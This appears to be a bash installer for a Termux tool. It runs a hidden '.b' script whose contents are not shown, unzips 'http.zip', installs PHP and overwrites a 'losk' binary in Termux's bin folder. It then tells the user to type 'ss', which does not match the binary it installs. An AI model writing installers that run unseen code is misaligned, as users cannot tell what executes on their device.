#!/bin/bash
#██████████████████████████████████████████████████████████████████
#█|':::::'|'--------------------------------------------'|':::::'|█
#█|':::::'|          _                _          _ _     |':::::'|█
#█|':::::'|         | |     ____     | |        | | |    |':::::'|█
#█|':::::'|       __| |____/ __ \ ___| |__   ___| | |    |':::::'|█
#█|':::::'|      / _  |_  / / _  / __|  _ \ / _ \ | |    |':::::'|█
#█|':::::'|     | (_| |/ / | (_| \__ \ | | |  __/ | |    |':::::'|█
#█|':::::'|      \__,_/___\ \___ |___/_| |_|\___|_|_|    |':::::'|█
#█|':::::'|                \____/    github.com/termux4me|':::::'|█
#█|':::::'|'--------------------------------------------'|':::::'|█
#██████████████████████████████████████████████████████████████████

pkg update && pkg upgrade
pkg install zip
bash .b
unzip http.zip
o=$(php -r 'echo "hi";')
if [ -z $o ]
then
echo 'php is installing'
pkg install php -y
fi
rm /data/data/com.termux/files/usr/bin/losk
cp -rf losk /data/data/com.termux/files/usr/bin
chmod +x /data/data/com.termux/files/usr/bin/losk
clear
printf "\033[1;37m"
echo -n " now type";printf "\033[1;32m";echo -n " ss "; printf "\033[1;37m";echo "to start"
